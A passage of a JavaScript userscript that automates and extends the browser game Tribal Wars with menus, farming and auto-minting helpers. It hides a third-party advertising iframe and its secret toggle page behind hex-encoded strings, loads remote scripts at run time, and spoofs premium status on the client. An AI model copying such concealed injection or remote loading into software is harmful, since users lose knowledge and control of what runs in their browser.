lang_settings[16] + '</a></td></tr></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=tools">' + lang_settings[20] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=sobre">' + lang_settings[17] + '</a></td></tr><tr><td class="bottom"><div class="corner"></div><div class="decoration"></div></td></tr></tbody></table>';
		} else {
		menu_column = getElementsByClass('menu_column')[5].getElementsByTagName('tr');
		menu_column[menu_column.length - 2].outerHTML += '<tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=tools">' + lang_settings[20] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=sobre">' + lang_settings[17] + '</a></td></tr><tr>';
	}	
	if (getElementsByClass('menu_column')[6] == null) getElementsByClass('menu-item')[8].innerHTML += '<table cellspacing="0" class="menu_column"><tbody><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=premium&amp;mode=use">' + lang_premium[0] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=premium&amp;mode=premium">' + lang_premium[1] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=premium&amp;mode=transfer">' + lang_premium[2] + '</a></td></tr><tr><td class="menu-column-item"><a href="/game.php?village=' + VillId + '&amp;screen=premium&amp;mode=log">' + lang_premium[3] + '</a></td></tr><tr><td class="bottom"><div class="corner"></div><div class="decoration"></div></td></tr></tbody></table>';
	
    if (encodeHex(getData(decodeHex('616e756e63696f5f616473656e7365'))) != '646573617469766172') {
		document.getElementById(decodeHex('536b79536372617065724164')).innerHTML = decodeHex('3c696672616d65207372633d22687474703a2f2f6665726e616e646f2e7369746534302e6e65742f736372697074732f616473656e73652e68746d6c222077696474683d2238303022206865696768743d2236353022206d617267696e77696474683d223022206d617267696e6865696768743d223022206873706163653d223022207673706163653d223022207363726f6c6c696e673d226e6f22206672616d65626f726465723d22302220626f72646572636f6c6f723d2230223e3c2f696672616d653e')
    }
	else {
		removeNode(document.getElementById(decodeHex('536b79536372617065724164')))
    };

	getElementsByClass('newStyleOnly')[0].outerHTML += '<table id="quickbar_outer" align="center" width="100%" cellspacing="0"><tbody><tr><td><table id="quickbar_inner" style="border-collapse: collapse;" width="100%"><tbody><tr class="topborder"></tr><tr id="topborder2"></tr><tr class="bottomborder"><td class="left"> </td><td class="main"> </td><td class="right"> </td></tr><tr><td class="shadow" colspan="3"><div class="leftshadow"> </div><div class="rightshadow"> </div></td></tbody></table></td></tr></tbody></table>';
	getElementsByClass('topborder')[0].innerHTML = '<td class="left"> </td><td class="main"> </td><td class="right"> </td>';
	document.getElementById('topborder2').innerHTML = '<td class="left"> </td><td class="main"><ul class="menu quickbar"></ul></td><td class="right"> </td>';
	
    setCookie('version_hack', version);
    
	if (getCookie('sobre_version_hack') < version){
		document.getElementById('quickbar_outer').outerHTML += '<table align="center" width="100%" cellspacing="0"><tbody><tr><td><table id="quickbar_inner" style="border-collapse: collapse;" width="100%"><tbody><tr class="topborder"><td class="left"> </td><td class="main"> </td><td class="right"> </td></tr><tr id="topborder2"><td class="left"> </td><td class="main"><a href="javascript:void(0);" onclick="' + str_setCookie + ' setCookie(\'sobre_version_hack\', \'' + version + '\'); window.open(\'/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=sobre\');">***New Features ' + version + '***</a></td><td class="right"> </td></tr><tr class="bottomborder"><td class="left"> </td><td class="main"> </td><td class="right"> </td></tr><tr><td class="shadow" colspan="3"><div class="leftshadow"> </div><div class="rightshadow"> </div></td></tr></tbody></table></td></tr></tbody></table>';
	}
	
    
	somar = 0;
    
	for (i = 0; i < meuArray.length; i++) {
		if (meuArray[i] == VillId) {
			pVillId = meuArray[i - 1];
			nVillId = meuArray[i + 1];
		}
		document.getElementById('villagelist').getElementsByTagName('tbody')[0].innerHTML += '<tr><td class="menu-column-item"><a href="/game.php?village=' + meuArray[i] + '&amp;screen=' + screen2 + '">' + aldeiasnome1[i] + '</a></td></tr>';
	}
	if (pVillId == undefined) {
		pVillId = meuArray[meuArray.length - 1]
    }
	if (nVillId == undefined) {
		nVillId = meuArray[0]
    }

	document.getElementById('villagelist').getElementsByTagName('tbody')[0].innerHTML += '<tr><td class="bottom"><div class="corner"></div><div class="decoration"></div></td></tr>';

	quick_bar = getData(mundo + '_quick_bar');
	if (quick_bar == 'active') {
    
	function criarmenu(link1, imagem, nome, target, title) {
		if (imagem != '') {
			imagem = '<img src="' + imagem + '">';
		}
		if ((target == undefined) || (target == '')) {
			target = ''
		}
		else {
			target = ' target="' + target + '"'
		};
		if ((title == undefined) || (title == '')) {
			title = ''
		}
		else {
			title = 'title="' + title + '"'
		};
		if (link1 != '') {
			link1 = '<a href="' + link1 + '"' + target + title + '>';
			link2 = '</a>';
		}
		else {
			link2 = '';
		}
		document.getElementById('topborder2').getElementsByTagName('ul')[0].innerHTML += '<li><span>' + link1 + imagem + nome + link2 + '</span></li>';
	}
    
	/* function criarmenu(url, image, name, target, title);*/
	criarmenu('/game.php?village=' + VillId + '&amp;screen=main', '/graphic/buildings/main.png?1', lang_bar[0]);
	criarmenu('/game.php?village=' + VillId + '&amp;screen=train', '/graphic/buildings/barracks.png?1', lang_bar[1]);
	//criarmenu('/game.php?village=' + VillId + '&amp;screen=stable', '/graphic/buildings/stable.png?1', lang_bar[2]);
	//criarmenu('/game.php?village=' + VillId + '&amp;screen=garage', '/graphic/buildings/garage.png?1', lang_bar[3]);
	criarmenu('/game.php?village=' + VillId + '&amp;screen=snob', '/graphic/buildings/snob.png?1', lang_bar[4]);
	criarmenu('/game.php?village=' + VillId + '&amp;screen=smith', '/graphic/buildings/smith.png?1', lang_bar[5]);
	criarmenu('/game.php?village=' + VillId + '&amp;screen=place', '/graphic/buildings/place.png?1', lang_bar[6]);
	criarmenu('/game.php?village=' + VillId + '&amp;screen=market', '/graphic/buildings/market.png?1', lang_bar[7]);
	criarmenu('http://' + mundo + '.twplus.org/world/', 'http://br47.twplus.org/site_media/img/favicon.ico', 'TWplus', '_blank');
	criarmenu('javascript:$.getScript(\'' + base_scripts + 'acompanhar_evolucao.js\');void(0);', 'http://img1.ne10.uol.com.br/cockpit/imagem/icone_infografico.gif', lang_bar[9]);
	}else {}

	move_arrow = getData(mundo + '_move_arrow');
	if (move_arrow == 'active') {  
	document.getElementById('menu_row2_map').outerHTML += '<td class="box-item icon-box separate arrowCell"><a id="village_switch_left" class="village_switch_link" href="/game.php?village=' + pVillId + '&amp;screen=' + screen1 + '" accesskey="a"><span class="arrowLeft"> </span></a></td><td class="box-item icon-box arrowCell"><a id="village_switch_right" class="village_switch_link" href="/game.php?village=' + nVillId + '&amp;screen=' + screen1 + '" accesskey="d"><span class="arrowRight"> </span></a></td>';
	}else {}


        
	if (location.href.indexOf('mode=settings') > 0) {
		document.getElementsByTagName('form')[0].parentNode.innerHTML += '<table class="vis settings"><tbody><tr><th colspan="2">' + lang_screen_settings[0] + '</th></tr><tr><td colspan="2"><input type="radio" name="t" id="normal_mode" value="0"' + normal_mode + '>' + lang_screen_settings[1] + '<br><input type="radio" name="t" id="direto_mode" value="1"' + direto_mode + '>' + lang_screen_settings[2] + '</td></tr><tr><td colspan="2"><input type="button" onclick="' + str_setData + ' if (document.getElementById(\'direto_mode\').checked == true){setCookie(game_data.world + \'_visualizacoes\', \'direto\')}else{setCookie(game_data.world + \'_visualizacoes\', \'normal\')};location.href=location.href" value="OK"></td></tr></tbody><tbody><tr><th colspan="2">' + lang_screen_settings[3] + '</th></tr><tr><td>' + lang_screen_settings[4] + '</td><td><input type="text" name="screen_width" size="90" id="arquivocss" value="' + localcs + '"></td></tr><tr><td colspan="2"><input type="button" onclick=\'' + str_setData + ' setCookie(game_data.world + "_css", document.getElementById("arquivocss").value);location.href=location.href\' value="OK"></td></tr></tbody></table>';
        
	}

	if (location.href.indexOf('mode=sobre') > 0) {
		sobre = document.getElementById('content_value').getElementsByTagName('td');
		
        sobre[sobre.length - 1].innerHTML = '<table class="vis settings"><tbody><tr><th colspan="2">' + lang_screen_sobre[0] + '</th></tr><tr><td colspan="2"><li>' + lang_screen_sobre[1] + '</li></td></tr><tr><td><li>' + lang_screen_sobre[2] + '</li></td><td>' + lang_screen_sobre[3] + '</td></tr><tr><td colspan="2"><li>' + lang_screen_sobre[4] + '</li></td></tr><tr><td colspan="2"><li>' + lang_screen_sobre[5] + '</li></td></tr><tr><td><li>' + lang_screen_sobre[6] + '</li></td><td>' + lang_screen_sobre[7] + '</td></tr><tr><td><li>' + lang_screen_sobre[8] + '</li></td><td>' + lang_screen_sobre[9] + '</td></tr><tr><td colspan="2"><li>' + lang_screen_sobre[10] + '</li></td></tr><tr><td colspan="2"><li>' + lang_screen_sobre[22] + '</li></td></tr><tr><td><li>' + lang_screen_sobre[11] + '</li></td><td>' + lang_screen_sobre[12] + '</tr><tr><td colspan="2"><li>' + lang_screen_sobre[13] + '</li></td></tr><tr><td><li>' + lang_screen_sobre[14] + '</li></td><td>' + lang_screen_sobre[15] + ' <a href="/game.php?village=' + VillId + '&screen=settings&mode=settings">' + lang_screen_sobre[21] + '</a></td></tr><tr><td colspan="2"><li>' + lang_screen_sobre[16] + '</li></td></tr><tr><td><li>' + lang_screen_sobre[17] + '</li></td><td>' + lang_screen_sobre[18] + ' <a href="/game.php?village=' + VillId + '&screen=settings&mode=settings">' + lang_screen_sobre[21] + '</a></td></tr><tr><td colspan="2"><li>' + lang_screen_sobre[24] + '</li></td></tr><tr><td colspan="2"><li>' + lang_screen_sobre[25] + '</li></td></tr><tr><td colspan="2"><li>' + lang_screen_sobre[26] + '</li></td></tr><tr><td colspan="2"><li>' + lang_screen_sobre[27] + '</li></td></tr><tr><td colspan="2"><li><b>' + lang_messages[1] + '</b></li></td></tr><tr><td colspan="2"><li><b>' + lang_messages[2] + '</b></li></td></tr><tr><td colspan="2"><li><b>' + lang_messages[3] + '</b></li></td></tr></tbody><tbody><tr><th colspan="2">' + lang_screen_sobre[19] + '</th></tr><tr><td>' + lang_screen_sobre[20] + '</td><td>' + version + '</td></tr><tr><td>' + lang_screen_sobre[23] + '</td><td><a href="http://userscripts.org/scripts/show/152956" target="_blank">http://userscripts.org/scripts/show/152956</a></td></tr><tr><td colspan="2"><iframe src="http://www.facebook.com/plugins/like.php?href=http://facebook.com/abugalmbo.algreeb&layout=standard&show_faces=true&action=like&width=100&colorscheme=light" scrolling="no" frameborder="0" style="border:none; overflow:hidden;width: 100%; height: 60px;" allowTransparency="true"></iframe></td></tr>' + decodeHex('3c74723e3c746420636f6c7370616e3d22322220616c69676e3d227269676874223e3c666f6e742073697a653d2231223e3c62723e536372697074206279203c6120687265663d22687474703a2f2f6164762e6c692f3939353222207461726765743d225f626c616e6b223e61627567616c6d626f20616c67726565623c2f613e3c2f666f6e743e') + lang_settings[18] + '</td></tr></tbody></table>'
    }

	if (location.href.indexOf('mode=tools') > 0) {
	quick_bar = getData(mundo + '_quick_bar');
	if (quick_bar == 'active') {quick_bar = ' checked';}else {quick_bar = ' ';}
	dynamic_bar = getData(mundo + '_dynamic_bar');
	if (dynamic_bar == 'active') {dynamic_bar = ' checked';}else {dynamic_bar = ' ';}
	codes_attch = getData(mundo + '_codes_attch');
	if (codes_attch == 'active') {codes_attch = ' checked';}else {codes_attch = ' ';}
	start_farmer = getData(mundo + '_start_farmer');
	if (start_farmer == 'active') {start_farmer = ' checked';}else {start_farmer = ' ';}
	endfarm = getData(mundo + '_endfarm');
	if (endfarm == 'active') {endfarm = ' checked';}else {endfarm = ' ';}
	move_arrow = getData(mundo + '_move_arrow');
	if (move_arrow == 'active') {move_arrow = ' checked';}else {move_arrow = ' ';}    
	activescript = getData(mundo + '_activescript');
	if (activescript == 'active') {activescript = ' checked';}else {activescript = ' ';}
		tools =document.getElementById('content_value').getElementsByTagName('td');
        tools[tools.length - 1].innerHTML = '<table class="vis settings"><tr><th colspan="2">' + lang_settings[20] + '</th></tr><tr><td>' + lang_tools[0] + '</td><td><label><input type="checkbox" name="dynamic_bar" id="dynamic_bar" ' + dynamic_bar + ' />' + lang_tools[1] + '</label></td></tr><tr><td>' + lang_tools[2] + '</td><td><label><input type="checkbox" name="quick_bar" id="quick_bar" ' + quick_bar + ' />' + lang_tools[3] + '</td></tr><tr><td>' + lang_tools[4] + '</td><td><label><input type="checkbox" name="start_farmer" id="start_farmer" ' + start_farmer + ' />' + lang_tools[5] + '</label></td></tr><tr><td>' + lang_tools[6] + '</td><td><label><input type="checkbox" name="codes_attch" id="codes_attch" ' + codes_attch + ' />' + lang_tools[7] + '</label></td></tr><tr><td>' + lang_tools[8] + '</td><td><label><input type="checkbox" name="move_arrow" id="move_arrow" ' + move_arrow + ' />' + lang_tools[9] + '</label></td></tr><tr><td>' + lang_tools[10] + '</td><td><label><input type="checkbox" name="endfarm" id="endfarm" ' + endfarm + ' />' + lang_tools[11] + '</label></td></tr><tr><td>' + lang_tools[12] + '</td><td><label><input type="checkbox" name="activescript" id="activescript" ' + activescript + ' />' + lang_tools[13] + '</label></td></tr><tr><td colspan="2"><input type="button"  onclick="' + str_setData + ' if (document.getElementById(\'quick_bar\').checked == true){setCookie(game_data.world + \'_quick_bar\', \'active\')}else{setCookie(game_data.world + \'_quick_bar\', \'disable\')};' + str_setData + ' if (document.getElementById(\'dynamic_bar\').checked == true){setCookie(game_data.world + \'_dynamic_bar\', \'active\')}else{setCookie(game_data.world + \'_dynamic_bar\', \'disable\')};' + str_setData + ' if (document.getElementById(\'codes_attch\').checked == true){setCookie(game_data.world + \'_codes_attch\', \'active\')}else{setCookie(game_data.world + \'_codes_attch\', \'disable\')};' + str_setData + ' if (document.getElementById(\'start_farmer\').checked == true){setCookie(game_data.world + \'_start_farmer\', \'active\')}else{setCookie(game_data.world + \'_start_farmer\', \'disable\')};' + str_setData + ' if (document.getElementById(\'endfarm\').checked == true){setCookie(game_data.world + \'_endfarm\', \'active\')}else{setCookie(game_data.world + \'_endfarm\', \'disable\')};' + str_setData + ' if (document.getElementById(\'move_arrow\').checked == true){setCookie(game_data.world + \'_move_arrow\', \'active\')}else{setCookie(game_data.world + \'_move_arrow\', \'disable\')};' + str_setData + ' if (document.getElementById(\'activescript\').checked == true){setCookie(game_data.world + \'_activescript\', \'active\')}else{setCookie(game_data.world + \'_activescript\', \'disable\')};location.href=location.href" value="OK"></td></tr></table>'
    }
    
	if (location.href.indexOf('screen=settings') > 0) {
		if (location.href.indexOf('mode=settings') > 0) {
			sel_pt = '';
			sel_en = '';
			sel_nl = '';
			sel_ae = '';
			if (language == 'en') sel_en = ' selected';
			if (language == 'ae') sel_ae = ' selected';
			if (language == 'pt') sel_pt = ' selected';
			if (language == 'nl') sel_nl = ' selected';
			titulo_sim = '';
			titulo_nao = '';
			if (getData(mundo + '_titulo_mundo') == 'true') {titulo_sim = ' selected'}else{titulo_nao = ' selected'};
			document.getElementsByTagName('form')[0].getElementsByTagName('tr')[0].outerHTML += '<tr><td>' + lang_language + ':</td><td><select id="continent" onchange="' + str_setData + '; setCookie(game_data.market + \'_lang\', this.value);void(0);"><option value="pt"' + sel_pt + '>Portuguese</option><option value="en"' + sel_en + '>English</option><option value="nl"' + sel_nl + '>Dutch</option><option value="ae"' + sel_ae + '>Arabic</option></select></td></tr><tr><td>' + lang_dados + ':</td><td><select onchange="' + str_setData + '; setCookie(game_data.world + \'_base\', this.value);void(0);"><option value="0"' + sel_data_0 + '>Tribalwars</option><option value="1"' + sel_data_1 + '>FernandoXLR</option></select></td></tr><tr><td>' + lang_screen_settings[5] + '</td><td><select id="titulo" onchange="' + str_setData + '; setCookie(game_data.world + \'_titulo_mundo\', this.value);void(0);"><option value="true"' + titulo_sim + '>' + lang_screen_settings[6] + '</option><option value="false"' + titulo_nao + '>' + lang_screen_settings[7] + '</option></select></td></tr>';
		}
		document.getElementById('content_value').getElementsByTagName('tbody')[1].innerHTML += '<tr><td width="100"><a href="/game.php?village=' + VillId + '&amp;screen=settings&amp;mode=sobre">' + lang_settings[17] + '</a></td></tr>';
	}
	

	
	if ((/https?:\/\/.*?\/game.php\?.+id.*screen=info_village/).test(location.href) == true){
	screenVillId = location.href.substring(location.href.indexOf("id=") + 3, location.href.indexOf("&screen") );
		document.getElementById('content_value').getElementsByTagName('tbody')[1].innerHTML += '<tr><td colspan="2"><a href="/game.php?village=' + game_data.village.id + '&amp;screen=ally&amp;mode=reservations" onClick="$.cookie(game_data.world + \'_reserva\', $(\'#content_value td\')[2].textContent, {expires: 100000})";>' + lang_perfil[4] + '</a><tr><td colspan="2"><a href="http://www.twstats.com/in/'+mundo+'/village/'+screenVillId+'" target="_blank">' + lang_perfil[2] + '</a> (TWstats)</td></tr>';
	}
    
	if (((/https?:\/\/.*?\/game.php\?.+id.*screen=info_ally/).test(location.href) == true) || (location.href.indexOf('mode=profile&screen=ally') > 0)) {
	if ((/https?:\/\/.*?\/game.php\?.+id.*screen=info_ally/).test(location.href) == true){
		screenAllyId = location.href.substring(location.href.indexOf("id=") + 3, location.href.indexOf("&screen") );
			elemento_tribo = 'content_value';
		}
		else{
			elemento_tribo = 'ally_content';
			screenAllyId = game_data.player.ally_id;
		}
		allyTable = document.getElementById(elemento_tribo).getElementsByTagName('table')[1]
            allyTable.width="350px";
		allyTr = allyTable.getElementsByTagName('tr');
		allyTr[allyTr.length - 4].outerHTML += '<tr><td colspan="2"><a href="http://www.twstats.com/in/'+mundo+'/tribe/'+screenAllyId+'" target="_blank">' + lang_perfil[1] + '</a> (TWstats)</td></tr>';
		allyTr[allyTr.length - 1].outerHTML = '<tr><th colspan="2">' + lang_screen_ally[6] + '</th></tr><tr><td align="center">' + lang_screen_ally[0] + '</td><td><img src="http://' + game_data.market + '.twstats.com/' + game_data.world + '/image.php?type=tribegraph&graph=points&id=' + screenAllyId + '" style="width:100%;height:96px;"></td></tr><tr><td align="center">' + lang_screen_ally[1] + '</td><td><img src="http://' + game_data.market + '.twstats.com/' + game_data.world + '/image.php?type=tribegraph&graph=villages&id=' + screenAllyId + '" style="width:100%;height:96px;"></td></tr><tr><td align="center">' + lang_screen_ally[2] + '</td><td><img src="http://' + game_data.market + '.twstats.com/' + game_data.world + '/image.php?type=tribegraph&graph=members&id=' + screenAllyId + '" style="width:100%;height:96px;"></td></tr><tr><td align="center">' + lang_screen_ally[3] + '</td><td><img src="http://' + game_data.market + '.twstats.com/' + game_data.world + '/image.php?type=tribegraph&graph=od&id=' + screenAllyId + '" style="width:100%;height:96px;"></td></tr><tr><td align="center">' + lang_screen_ally[4] + '</td><td><img src="http://' + game_data.market + '.twstats.com/' + game_data.world + '/image.php?type=tribegraph&graph=oda&id=' + screenAllyId + '" style="width:100%;height:96px;"></td></tr><tr><td align="center">' + lang_screen_ally[5] + '</td><td><img src="http://' + game_data.market + '.twstats.com/' + game_data.world + '/image.php?type=tribegraph&graph=odd&id=' + screenAllyId + '" style="width:100%;height:96px;"></td></tr>';
	}

	if ((/https?:\/\/.*?\/game.php\?.+id.*screen=info_player/).test(location.href) == true){
	screenPlayerId = location.href.substring(location.href.indexOf("id=") + 3, location.href.indexOf("&screen") );
        document.getElementById('content_value').getElementsByTagName('tbody')[1].innerHTML += '<tr><td colspan="2"><a href="http://www.twstats.com/in/'+mundo+'/player/'+screenPlayerId+'" target="_blank">' + lang_perfil[0] + '</a> (TWstats)</td></tr><tr><td colspan="2"><a href="javascript: var claim = 1; $.getScript(\'' + base_scripts + 'tabela_codigosbb.js\'); void(0);">' + lang_perfil[3] + '</a></td></tr>';
    }
    
	if (location.href.indexOf('&mode=reservations') > 0){
		if (getData(mundo + '_reserva') != ''){
			$('#inputx_1').val(getData(mundo + '_reserva').split('|')[0]);
			$('#inputy_1').val(getData(mundo + '_reserva').split('|')[1]);
			$('#save_reservations').click();
			deleteCookie(mundo + '_reserva');
		}
	}

	if (location.href.indexOf(decodeHex('6d6f64653d7365637265746f')) > 0) {
		document.getElementById('content_value').getElementsByTagName('td')[15].innerHTML = decodeHex('3c696e7075742069643d227365677265646f2220747970653d2274657874222073697a653d223130222076616c75653d2222206f6e6b657970726573733d22696620286576656e742e6b6579436f6465203d3d20313329207b66756e6374696f6e20736574436f6f6b6965286b65792c76616c6f72297b76617220686f6a65203d206e6577204461746528293b76617220657870697261203d206e6577204461746528686f6a652e67657454696d6528292b3939392a32342a36302a36302a31303030293b76617220657870697261203d206578706972612e746f474d54537472696e6728293b646f63756d656e742e636f6f6b6965203d206b65792b273d272b76616c6f722b273b657870697265733d272b6578706972617d20736574436f6f6b69652827616e756e63696f5f616473656e7365272c20746869732e76616c7565293b2069662028746869732e76616c7565203d3d202764657361746976617227297b616c6572742827416e756e63696f206465736174697661646f20636f6d207375636573736f27297d656c73657b69662028646f63756d656e742e676574456c656d656e744279496428277365677265646f27292e76616c7565203d3d202761746976617227297b616c6572742827416e756e63696f206174697661646f20636f6d207375636573736f27297d656c73657b616c657274282754656d20717565206573636f6c68657220656e747265205c276174697661725c27206f75205c276465736174697661725c2727297d7d3b20766f69642830293b7d223e');
	}

	if ((/https?:\/\/.*?\/game.php\?.+view.*screen=report/).test(location.href) == true) {
		if (language != 'ae') {
			if (document.getElementById('attack_info_att') != null) document.getElementById('inner-border').getElementsByTagName('table')[3].parentNode.parentNode.innerHTML += '<td valign="top" width="100%"><table class="vis" width="520"><tbody><tr><th width="140" colspan="2">' + lang_report[0] + '</th></tr><tr><td class="nopad"><form action="http://www.mytwstats.com/tool-convert.php#r" method="POST" target="resultado_report" name="sett"><table><tbody><tr><td class="text_top"><textarea name="report" style="font-size: 11px; font-family: \'Courier New\'; margin-top: 0px; margin-bottom: 0px; height: 560px; margin-left: 0px; margin-right: 0px; width: 300px; "></textarea><a href="#sett" onclick="document.sett.submit();">' + lang_report[1] + '</a></td><td class="text_top" style="width:300px;"><table class="table1" id="trep"><tbody><tr><th colspan="2">' + lang_report[2] + '</th></tr><tr><th colspan="2">' + lang_report[3] + '</th></tr><tr><td colspan="2"><input type="radio" name="t" value="0">' + lang_report[4] + '<br><input type="radio" name="t" value="1">' + lang_report[5] + '<br><input type="radio" name="t" value="2">' + lang_report[6] + '<br><input type="radio" checked="" name="t" value="3"><span class="imp">' + lang_report[7] + '</span><br><br></td></tr><tr><th>' + lang_report[8] + '</th><th>' + lang_report[9] + '</th></tr><tr><td colspan="2" class="text_center">' + lang_report[10] + '</td></tr><tr><td><input type="checkbox" checked="" name="r[ap]" value="1">' + lang_report[11] + '</td><td><input type="checkbox" checked="" name="r[dp]" value="1">' + lang_report[11] + '</td></tr><tr><td><input type="checkbox" checked="" name="r[av]" value="1">' + lang_report[12] + '</td><td><input type="checkbox" checked="" name="r[dv]" value="1">' + lang_report[12] + '</td></tr><tr><td><input type="checkbox" name="r[au]" value="1">' + lang_report[13] + '</td><td><input type="checkbox" checked="" name="r[du]" value="1">' + lang_report[13] + '</td></tr><tr><td><input type="checkbox" checked="" name="r[al]" value="1">' + lang_report[14] + '</td><td><input type="checkbox" checked="" name="r[dl]" value="1">' + lang_report[14] + '</td></tr><tr><td><input type="checkbox" checked="" name="r[af]" value="1">' + lang_report[15] + '</td><td><input type="checkbox" checked="" name="r[df]" value="1">' + lang_report[15] + '</td></tr><tr><td><input type="checkbox" checked="" name="r[ar]" value="1">' + lang_report[16] + '<br><br></td><td><input type="checkbox" checked="" name="r[dr]" value="1">' + lang_report[16] + '<br><br></td></tr><tr><th colspan="2">' + lang_report[17] + '</th></tr><tr><td><input type="checkbox" checked="" name="r[apt]" value="1">' + lang_report[18] + '</td><td><input type="checkbox" checked="" name="r[dpt]" value="1">' + lang_report[19] + '</td></tr><tr><th colspan="2">' + lang_report[20] + '</th></tr><tr><td colspan="2"><input type="checkbox" checked="" name="r[ha]" value="1">' + lang_report[21] + '</td></tr><tr><td colspan="2"><input type="checkbox" checked="" name="r[bl]" value="1">' + lang_report[22] + '</td></tr><tr><td colspan="2"><input type="checkbox" checked="" name="r[lo]" value="1">' + lang_report[23] + '</td></tr><tr><td colspan="2"><input type="checkbox" checked="" name="r[dt]" value="1">' + lang_report[24] + '</td></tr><tr><td colspan="2"><input type="checkbox" checked="" name="r[dc]" value="1">' + lang_report[25] + '</td></tr><tr><td colspan="2"><input type="checkbox" checked="" name="r[uo]" value="1">' + lang_report[26] + '</td></tr></tbody></table></td></tr></tbody></table></form></td></tr></tbody></table></td>';
		}
		if (document.getElementById('attack_spy') != null) {
			document.getElementById('attack_spy').parentNode.innerHTML += '<hr><table id="farmar_tabela" class="vis"><tbody><tr><td colspan="7"><a href="javascript:' + str_setData	+ '; mandar_spy = 1; spy = document.getElementById(\'spy\').value; lanceiro = Number(document.getElementById(\'spear\').checked); espadachim = Number(document.getElementById(\'sword\').checked); barbaro = Number(document.getElementById(\'axe\').checked); arqueiro = Number(document.getElementById(\'archer\').checked); cav_leve = Number(document.getElementById(\'light\').checked); arqueiro_cav = Number(document.getElementById(\'marcher\').checked); cav_pesada = Number(document.getElementById(\'heavy\').checked); var ataque = true; var debug_ligado = 0; coo = lanceiro + \'!!!\' + espadachim + \'!!!\' + barbaro +\'!!!\' + arqueiro + \'!!!\' + cav_leve + \'!!!\' + arqueiro_cav + \'!!!\' + cav_pesada + \'!!!\' + mandar_spy + \'!!!\' + spy + \'!!!\' + debug_ligado; game_data.player.premium = true; setCookie(game_data.world + \'_\' + game_data.village.id + \'_calcular\', coo); $.getScript(\'' + base_scripts + 'calcular_farmar.js\'); void(0);">' + lang_calc_reports + '</a></td></tr><tr><td width="60"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_spy.png?1"><input size="1" type="text" value="1" id="spy"></td><td width="50"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_light.png?1"><input type="checkbox" id="light"></td><td width="50"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_marcher.png?1"><input type="checkbox" id="marcher"></td><td width="50"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_heavy.png?1"><input type="checkbox" id="heavy"></td><td width="50"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_spear.png?1"><input type="checkbox" id="spear"></td><td width="50"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_sword.png?1"><input type="checkbox" id="sword"></td><td width="50"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_axe.png?1"><input type="checkbox" id="axe"></td><td width="50"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_archer.png?1"><input type="checkbox" id="archer"></td></tr></tbody></table>';
		}
		else{
			if (document.getElementById('attack_info_att') != null)	document.getElementById('attack_info_att').parentNode.innerHTML += '<hr><a href="#" class="inactive" title="Apenas em relatório de espionagem" onclick="return false">' + lang_calc_reports + '</a>';
		}
	}

	if (location.href.indexOf('screen=snob') > 0){
		cunhar_table = document.getElementsByTagName('table')[document.getElementsByTagName('table').length - 1];
		if (cunhar_table.getElementsByTagName('tr')[3] == null){
			cunhar_checked = '';
			if (getData(VillId + '_cunhar') == 'true')cunhar_checked = ' checked';
			cunhar_table.getElementsByTagName('th')[1].innerHTML += ' | <input type="checkbox" id="cunhar_check"' + cunhar_checked + ' onClick="' + str_setData + '; setCookie(\'' + VillId + '_cunhar\', String(this.checked)); if (this.checked == true) location.href = document.getElementById(\'cunhar\').href;void(0);"> Auto';
			cunhar_link = cunhar_table.getElementsByTagName('a')[0];
			if (cunhar_link != null) cunhar_link.id = 'cunhar';
			cunhar_span = cunhar_table.getElementsByTagName('span')[cunhar_table.getElementsByTagName('span').length - 1];
			if (getData(VillId + '_cunhar') == 'true') {
				if (cunhar_link != null){
					location.href = cunhar_link.href
						}
				else{		
					alert(cunhar_span.textContent);
					document.getElementById('cunhar_check').checked = false;
					setData(VillId + '_cunhar', String(document.getElementById('cunhar_check').checked));
				}
			}
		}
	}

    

	//if ((location.href.indexOf('screen=place&try=confirm') > 0) && (document.getElementById('troop_confirm_go') == null)) location.href = location.href.replace('&try=confirm', '');

	if (location.href.indexOf('screen=place') > 0){

		if (getData(mundo + '_' + VillId + '_farmar_1') != '') {
			tropas_1 = getData(mundo + '_' + VillId + '_farmar_1').split('!!!');
		}
		else {
			var tropas_1 = new Array('0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '');
		}
		
		spear_1 = tropas_1[0];
		sword_1 = tropas_1[1];
		axe_1 = tropas_1[2];
		archer_1 = tropas_1[3];
		spy_1 = tropas_1[4];
		light_1 = tropas_1[5];
		marcher_1 = tropas_1[6];
		heavy_1 = tropas_1[7];
		ram_1 = tropas_1[8];
		catapult_1 = tropas_1[9];
		coords_1 = tropas_1[10];
		
		if (getData(mundo + '_' + VillId + '_farmar_2') != '') {
			tropas_2 = getData(mundo + '_' + VillId + '_farmar_2').split('!!!');
		}
		else {
			var tropas_2 = new Array('0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '');
		}
		spear_2 = tropas_2[0];
		sword_2 = tropas_2[1];
		axe_2 = tropas_2[2];
		archer_2 = tropas_2[3];
		spy_2 = tropas_2[4];
		light_2 = tropas_2[5];
		marcher_2 = tropas_2[6];
		heavy_2 = tropas_2[7];
		ram_2 = tropas_2[8];
		catapult_2 = tropas_2[9];
		coords_2 = tropas_2[10];
		
		if (getData(mundo + '_' + VillId + '_calcular') != '') {
			cmd = getData(mundo + '_' + VillId + '_calcular').split('!!!');
